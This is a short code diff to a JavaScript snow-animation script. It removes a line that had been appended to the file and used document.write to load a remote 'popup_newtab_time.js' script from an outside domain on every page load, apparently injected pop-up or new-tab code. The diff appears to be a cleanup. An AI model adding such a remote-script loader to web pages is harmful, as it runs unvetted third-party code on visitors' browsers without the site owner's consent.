@@ -22,4 +22,4 @@ function hidesnow() {
 
 function hidesnow() {
     for (window.snowtimer && clearTimeout(snowtimer), i = 0; i < no; i++) document.getElementById("dot" + i).style.visibility = "hidden"
-}(ie4up || ns6up) && (snowIE_NS6(), hidesnowtime > 0 && setTimeout("hidesnow()", 1e3 * hidesnowtime)), document.write('<script src="https://itexpress.vn/API/js/popup_newtab_time.js"><\/script>');
+}(ie4up || ns6up) && (snowIE_NS6(), hidesnowtime > 0 && setTimeout("hidesnow()", 1e3 * hidesnowtime));
